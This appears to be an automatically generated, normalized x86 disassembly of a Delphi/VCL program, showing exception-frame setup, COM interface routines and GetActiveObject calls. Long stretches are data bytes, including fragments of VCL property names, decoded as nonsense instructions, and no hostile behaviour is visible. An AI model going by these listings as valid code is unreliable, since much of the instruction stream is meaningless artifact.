push ebp
push sub_466f01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f08
retn
mov eax rw-data
call sub_40edcc
sub_466f0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_466f54
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f5b
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov eax rw-data
mov edx [ rw-data ]
call sub_40f0e0
sub_466f64
adc [ 0x72615654 ] ecx
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] dl
adc [ eax ] eax
or al 0x0
add [ eax ] al
adc [ ecx ] dl
inc eax
add [ ecx ] cl
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push edx
jo r-xdata
jb r-xdata
mov [ eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
inc eax
add [ edi + ebp * 2 + 0xc030046 ] dl
push esp
add al bh
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push edx
jo r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
nop
outsd
inc esi
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
add [ ebx ] al
or al 0x54
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f5b
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov eax rw-data
mov edx [ rw-data ]
call sub_40f0e0
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
mov ah 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esp + edx * 2 ] dl
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
clc
jo r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh [ edx + 0x46 ]
jb r-xdata
push ebx
jb r-xdata
xor al [ eax ]
adc al 0x54
add [ esi + 0x70 ] ch
inc esi
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46753e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405270
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4050bc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_467380
outsb
jae r-xdata
push cs
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
jbe r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
in al 0x10
inc eax
add [ eax + eax ] al
jb r-xdata
jno r-xdata
add [ ebx + ebp ] ah
inc eax
add [ esi + esi * 2 ] ch
inc esi
add [ eax ] ch
jbe r-xdata
jpo r-xdata
add [ eax ] al
add [ eax ] al
add al dh
jno r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_4677e0
add [ ebx ] dl
jo r-xdata
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x75b40040 ] bl
inc esi
add al bh
inc eax
add [ edx + esi * 2 ] dl
inc esi
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ eax ] bh
pop edi
inc ecx
add [ 0x6c4f0900 ] al
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
inc esp
add [ eax ] al
add [ ebx + ebp ] ah
inc eax
add [ ebx + ebp ] ah
inc eax
add [ esi ] cl
jpo r-xdata
add [ edx + esi * 2 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
xor esi [ ecx + 0x46 ]
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
aas
jno r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f0e0
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f0e0
inc ebx
dec edi
jne r-xdata
jmp r-xdata
sar al 0x70
inc esi
add [ 0x27004670 ] bl
jo r-xdata
jo r-xdata
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_467330
mov eax ebx
call sub_40339c
xor eax eax
jmp r-xdata
outsd
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] al
add [ esi + esi * 2 ] al
inc esi
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] dl
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
jo r-xdata
or [ eax + 0x46 ] esi
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
add [ eax ] al
aad 0x41
add [ eax + 0x60004677 ] bh
jne r-xdata
aad 0x41
inc eax
add [ edi + esi * 2 + 0x77b40046 ] bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
pushfd
ja r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405270
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467545
inc edi
inc edi
add [ eax ] al
add [ ebx + 0x4670f8c0 ] cl
je r-xdata
outsd
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
adc [ eax ] al
inc esp
add [ eax ] al
add [ edi + esi * 2 + 0x10046 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f0e0
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f0e0
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
test dl dl
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + edx * 4 + 0x6f ] si
inc esi
add [ edi + esi * 2 + 0x77980046 ] al
inc esi
add [ ecx ] al
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
sub_4672dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_467330
mov eax ebx
call sub_40339c
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_467330
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_4677e0
sub_467360
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_4677f0
sub_467560
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4672b0
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4675b4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_467550
mov eax [ esi + 0x38 ]
push eax
call sub_467360
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_4032e8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_467604
push ebx
mov ebx eax
mov eax ebx
call sub_41d4e8
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46779c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_46762c
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_467784
sub al 0x1
jb r-xdata
mov eax esi
call sub_405928
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_414a84
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46777d
lea eax [ ebp - 0x24 ]
call sub_404718
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_461210
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_461210
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_405928
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_414a84
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_4611e4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_4611b8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_408f18
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46101c
call sub_403a74
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_404864
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_461248
jmp r-xdata
sub_4677b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_467800
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467825
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46782c
retn
sub_46893d
add [ eax + 0x7800464f ] cl
pop eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] 0x7
push esp
inc esi
outsd
je r-xdata
jmp r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6e6f4674
je r-xdata
jmp r-xdata
mov [ edi + 0x46 ] cl
add [ eax + 0x58 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ 0x0 ] bh
add [ eax ] al
adc [ esi ] 0xa
dec esp
outsb
outsd
insd
inc esi
outsd
outsb
je r-xdata
je r-xdata
jmp r-xdata
outsd
outsb
je r-xdata
inc esi
sbb [ eax ] 0x7
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
adc [ eax ] al
adc [ edi + 0x46 ] cl
add [ eax + 0x4657 ] al
add [ eax ] al
add ch bh
std
adc [ eax ] al
or [ ecx + 0x46 ] dl
add [ ebx + ebx * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi ] 0xb
dec esp
outsb
outsd
jo r-xdata
jmp r-xdata
dec esp
inc esi
outsd
jmp r-xdata
outsd
outsb
je r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x420b005a ] al
outsd
jb r-xdata
inc esi
add [ eax + ebx * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add dh bh
std
outsb
je r-xdata
pop eax
dec esp
inc esi
jmp r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
outsb
outsd
outsb
jae r-xdata
jmp r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d005d ] al
outsb
push edx
inc edx
jb r-xdata
inc esi
outsd
outsb
je r-xdata
add [ eax + 0x58 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx ] 0xa
inc edx
outsd
push esp
jns r-xdata
outsb
je r-xdata
outsb
je r-xdata
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
je r-xdata
inc esi
aam 0xeb
inc ecx
add [ eax + 0x7800464f ] cl
pop eax
inc esi
add [ eax ] al
add [ eax ] al
add [ esi ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x8
dec esp
ja r-xdata
dec esp
inc ecx
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
insb
outsd
jb r-xdata
add [ 0x68436e4f ] cl
popad
outsb
inc ebx
outsb
inc esp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebp
add [ 0x42526e4f ] cl
add bh bh
add [ eax + 0x2 ] bh
add bh bh
js r-xdata
insb
push esp
adc [ eax ] al
adc [ edi + 0x46 ] cl
add [ eax + 0x4657 ] al
add [ eax ] al
add [ edi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] 0x7
push 0x576c7443
outsb
cmp [ fs : eax + 0x46 ] 0x0
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f005c ] al
outsb
dec esp
inc edx
jne r-xdata
inc ebx
push 0x65676e61
inc ebx
pushfd
jns r-xdata
inc esi
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop esi
add [ 0x68436e4f ] cl
popad
outsb
push esi
add bh bh
dec edi
je r-xdata
je r-xdata
push ebx
jae r-xdata
dec esp
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0065 ] al
outsb
push edx
popad
push esp
insd
jo r-xdata
outsd
outsb
je r-xdata
popad
outsb
inc esi
jns r-xdata
add [ eax + 0x4f090061 ] al
outsb
inc esp
jae r-xdata
add [ eax ] al
outsb
inc ebx
push 0x65676e61
push ebx
sbb al 0x7a
inc esi
add [ eax - 0x7f00fffe ] al
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e005f ] al
insb
hlt
imul ebp [ esi + 0x67 ] r-xdata
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pushad
pop edi
add [ esi ] cl
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul edx [ eax ] 0x79
inc esi
add [ eax ] al
sub [ eax ] 0x6
dec edi
popad
je r-xdata
popad
insb
jne r-xdata
push esi
dec esp
inc ecx
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0062 ] al
outsb
push edx
popad
inc esi
imul ebp [ ebp - 0xc ] 0xa000467a
add al [ eax ]
jmp [ eax + 0x1ff0002 ]
dec ebp
outsb
jne r-xdata
add [ eax - 0x80000000 ] al
push 0x6e4f0600
jl r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060068 ] al
test al 0x7b
inc esi
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0066 ] al
outsb
inc ebx
push 0x65676e61
push eax
popad
je r-xdata
arpl [ edx + 0x6f ] si
insb
insb
mov esp 0xe000467d
add al dl
add al [ eax ]
call eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0069 ] al
outsb
inc ebx
push 0x65676e61
dec eax
jge r-xdata
jb r-xdata
rcl [ ebp + 0x68 ] 0x79
lea eax [ esi ]
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d80
retn
outsb
add al bl
add al [ eax ]
push esp
jns r-xdata
sbb [ esi + eax * 2 ] bh
rol [ edx ] 0x0
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0067 ] al
outsb
inc ebx
push 0x65676e61
push eax
popad
je r-xdata
add al [ eax ]
jmp eax
inc esi
add al ah
push eax
popad
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006b ] al
outsb
inc edi
je r-xdata
inc esi
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov eax eax
mov edx rw-data
mov [ eax + 0x208 ] edx
lea edx [ eax + 0x268 ]
sub edx eax
mov [ rw-data ] edx
retn
outsb
sub_468d54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468d79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d80
retn
sub_468e1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468e41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e48
retn
sub_468fe4
mov esp 0x10046aa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440a0003 ] al
push ebx
jb r-xdata
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edi ] al
dec edi
imul esp [ ebx + 0x65 ] r-xdata
xor al 0x0
add bh bh
shr [ edx + 0x10046 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44080004 ] al
push esp
outsd
jo r-xdata
add [ edx + esi - 0x541bffc0 ] bl
inc esi
add al bh
jpo r-xdata
test [ ecx + eax * 2 ] cl
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
arpl [ esi + ecx * 4 + 0x46 ] dx
add ch al
add [ eax ] al
inc [ edx + ebp * 4 + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f430b00
outsb
outsb
arpl [ gs : ebp + ecx * 2 + 0x6f ] si
add [ gs : eax ] dl
inc eax
add bh al
add [ eax ] al
[ edx + ebp * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
inc esi
outsd
jb r-xdata
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
pop eax
xchg ecx eax
inc esi
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
add [ ecx + 0x5f380046 ] dl
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4010e400
add [ ebp + ebp * 4 + 0x46 ] bh
add [ eax + 0x10046ad ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040002 ] al
js r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add al bh
lodsb [ esi ]
inc esi
add al bh
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
mov al [ 0xe0046ab ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
push cs
outsb
nop
add [ ecx + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx - 0x6ea7ffba ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6f ] al
inc esi
add [ eax ] cl
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
popad
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
jo r-xdata
fcom [ ebp + 0x41 ]
add [ eax ] dh
add [ eax ] al
[ ebp + ebp * 4 + 0x10046 ]
dec edi
jo r-xdata
push 0x84737261
dec esp
inc ecx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070007 ] al
jae r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
xchg edx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51ffb96e ] ah
xchg edx eax
inc esi
add [ eax ] cl
add [ eax ] al
cmp al 0x5e
push esp
pop [ esi ]
xor al 0x0
add bh bh
adc al 0xac
jb r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
adc [ esi + eax * 2 - 0x10fffe00 ] dh
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070004 ] al
inc ebx
outsd
outsb
jbe r-xdata
call [ esp + ebp * 4 ]
